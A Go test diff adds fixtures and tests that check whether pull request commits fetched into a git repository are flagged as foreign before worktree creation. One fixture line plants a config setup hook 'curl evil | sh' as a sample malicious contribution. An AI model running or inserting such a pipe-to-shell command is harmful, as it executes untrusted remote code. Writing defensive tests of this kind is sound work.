@@ -263,6 +263,132 @@ func TestCreateRemoteBranchAndForeign(t *testing.T) {
 
 // TestForeignPullRequestPaths: the usual ways a pull request reaches a checkout all count as
 // foreign, and a commit on the project's remote counts as its own however it is named.
+// prFixture is a repository with origin (the project's remote) and a pull request commit pr,
+// made in another clone and pushed to origin under refs/pull/7/head, refs/merge-requests/7/head
+// and refs/changes/07/7/1, as the forges keep them. This repository has not fetched it yet.
+func prFixture(t *testing.T) (f *fixture, identity, pr string) {
+	t.Helper()
+	f = newFixture(t)
+	origin := f.remote("origin")
+	other := filepath.Join(filepath.Dir(f.root), "contributor")
+	f.git(filepath.Dir(f.root), "clone", "-q", origin, other)
+	f.write(other, "flightdeck.json", `{"worktree":{"setup":"curl evil | sh"}}`)
+	f.git(other, "add", "flightdeck.json")
+	f.git(other, "commit", "-q", "-m", "pr")
+	pr = f.git(other, "rev-parse", "HEAD")
+	for _, ref := range []string{"refs/pull/7/head", "refs/merge-requests/7/head", "refs/changes/07/7/1"} {
+		f.git(other, "push", "-q", "origin", "HEAD:"+ref)
+	}
+	f.git(f.repo, "fetch", "-q", "origin")
+	return f, "file://" + origin, pr
+}
+
+// TestForeignRefspecs: a pull request refspec on the project's own remote keeps its refs out of
+// the remote's branches, whatever the names, with the default heads refspec beside it. A
+// one-off fetch is caught by its name, in any case.
+func TestForeignRefspecs(t *testing.T) {
+	for _, spec := range []string{
+		"+refs/pull/*/head:refs/remotes/origin/pull-request/*",
+		"+refs/pull/*/head:refs/remotes/origin/PR/*",
+		"+refs/merge-requests/*/head:refs/remotes/origin/mr/*",
+		"+refs/pull/*/head:refs/remotes/origin/pr-*",
+		"+refs/changes/*:refs/remotes/origin/changes/*",
+	} {
+		t.Run(spec, func(t *testing.T) {
+			f, identity, pr := prFixture(t)
+			if got := f.git(f.repo, "config", "--get-all", "remote.origin.fetch"); got != "+refs/heads/*:refs/remotes/origin/*" {
+				t.Fatalf("default refspec %q", got)
+			}
+			f.git(f.repo, "config", "--add", "remote.origin.fetch", spec)
+			f.git(f.repo, "fetch", "-q", "origin")
+			if refs := f.git(f.repo, "for-each-ref", "--contains", pr, "refs/remotes/origin/"); refs == "" {
+				t.Fatal("the refspec fetched nothing")
+			}
+			c, err := f.create(CreateOptions{Branch: "b", Base: pr, Remote: identity})
+			if err != nil || c.Foreign == "" {
+				t.Fatalf("a commit id under %s: %+v %v", spec, c, err)
+			}
+		})
+	}
+	for _, dst := range []string{"refs/remotes/origin/PR/7", "refs/remotes/origin/mr/7", "refs/remotes/origin/changes/07/7/1"} {
+		t.Run("one-off fetch to "+dst, func(t *testing.T) {
+			f, identity, pr := prFixture(t)
+			f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head:"+dst)
+			c, err := f.create(CreateOptions{Branch: "b", Base: pr, Remote: identity})
+			if err != nil || c.Foreign == "" {
+				t.Fatalf("a commit id under %s: %+v %v", dst, c, err)
+			}
+		})
+	}
+}
+
+func TestBranchRef(t *testing.T) {
+	heads := refspec{"refs/heads/*", "refs/remotes/origin/*"}
+	pulls := refspec{"refs/pull/*/head", "refs/remotes/origin/pr-*"}
+	all := refspec{"refs/*", "refs/remotes/origin/*"}
+	one := refspec{"refs/heads/main", "refs/remotes/origin/main"}
+	for _, c := range []struct {
+		ref   string
+		specs []refspec
+		want  bool
+	}{
+		{"refs/remotes/origin/main", []refspec{heads}, true},
+		{"refs/remotes/origin/pr-7", []refspec{heads, pulls}, false},
+		{"refs/remotes/origin/pr-", []refspec{heads, pulls}, false}, // the * may match nothing
+		{"refs/remotes/origin/main", []refspec{heads, pulls}, true},
+		{"refs/remotes/origin/main", []refspec{all}, false},
+		{"refs/remotes/origin/main", []refspec{one}, true},
+		{"refs/remotes/origin/dev", []refspec{one}, false},
+		{"refs/remotes/origin/main", nil, false},
+	} {
+		if got := branchRef(c.ref, c.specs); got != c.want {
+			t.Errorf("branchRef(%s, %v) = %v", c.ref, c.specs, got)
+		}
+	}
+}
+
+// TestReflogRuleBounds: an amend of a pull request commit stays foreign; more than
+// maxLocalCommits local commits are foreign; a start point that moves between the check and
+// git worktree add is foreign.
+func TestReflogRuleBounds(t *testing.T) {
+	f, identity, pr := prFixture(t)
+	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head:refs/heads/pr-7")
+	f.git(f.repo, "checkout", "-q", "-b", "am", pr)
+	f.git(f.repo, "commit", "-q", "--amend", "-m", "reworded")
+	f.git(f.repo, "checkout", "-q", "main")
+	if c, err := f.create(CreateOptions{Branch: "am", Remote: identity}); err != nil || c.Foreign == "" {
+		t.Errorf("an amended pull request: %+v %v", c, err)
+	}
+
+	f.git(f.repo, "checkout", "-q", "-b", "many", "origin/main")
+	for i := range maxLocalCommits + 1 {
+		f.git(f.repo, "commit", "-q", "--allow-empty", "-m", strconv.Itoa(i))
+	}
+	f.git(f.repo, "checkout", "-q", "main")
+	if c, err := f.create(CreateOptions{Branch: "many", Remote: identity}); err != nil || c.Foreign == "" {
+		t.Errorf("%d local commits: %+v %v", maxLocalCommits+1, c, err)
+	}
+	if c, err := f.create(CreateOptions{Branch: "fewer", Base: "many~1", Remote: identity}); err != nil || c.Foreign != "" {
+		t.Errorf("%d local commits: %+v %v", maxLocalCommits, c, err)
+	}
+
+	// A commit made on a detached HEAD in another linked worktree is in that worktree's reflog,
+	// which is read though no branch or main HEAD holds it.
+	det := filepath.Join(f.root, "detached")
+	f.git(f.repo, "worktree", "add", "-q", "--detach", det, "origin/main")
+	f.git(det, "commit", "-q", "--allow-empty", "-m", "on a detached head")
+	if c, err := f.create(CreateOptions{Branch: "fromdet", Base: f.git(det, "rev-parse", "HEAD"), Remote: identity}); err != nil || c.Foreign != "" {
+		t.Errorf("a commit from a linked worktree's detached HEAD: %+v %v", c, err)
+	}
+
+	f.git(f.repo, "branch", "moving", "origin/main")
+	testHookAfterCheck = func() { f.git(f.repo, "update-ref", "refs/heads/moving", pr) }
+	defer func() { testHookAfterCheck = nil }()
+	if c, err := f.create(CreateOptions{Branch: "moving", Remote: identity}); err != nil || !strings.Contains(c.Foreign, "moved") {
+		t.Errorf("a start point that moved: %+v %v", c, err)
+	}
+}
+
 func TestForeignPullRequestPaths(t *testing.T) {
 	f := newFixture(t)
 	origin := f.remote("origin")
